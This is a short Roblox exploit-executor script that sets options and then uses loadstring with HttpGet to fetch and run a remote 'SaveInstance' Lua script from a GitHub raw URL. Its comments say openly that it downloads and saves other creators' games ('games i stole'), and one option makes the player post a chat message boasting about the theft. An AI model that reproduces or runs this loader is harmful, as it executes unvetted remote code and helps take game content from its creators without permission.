--OPTIONS--
getgenv().chataboutsteal = false --basically it just makes you say "I have stolen this game, bye! :D" after u download a game
getgenv().kickaftersave = true --this kicks you once u are done downloading the game
getgenv().foldername = "GamesLOL" --this sets the name of the folder it should put the file into. (if u set it to "games i stole", it would put it into "workspace\games i stole")
getgenv().timebetweenmessages = 0.01 --if u have "chataboutsteal" set to true, this will set the time between the chat messages to whatever you type here.

--LOADSTRING--
loadstring(game:HttpGet("https://raw.githubusercontent.com/uiojaafdosijfafdssf/roblox/main/scripts/SaveInstanceKRNL.lua"))()
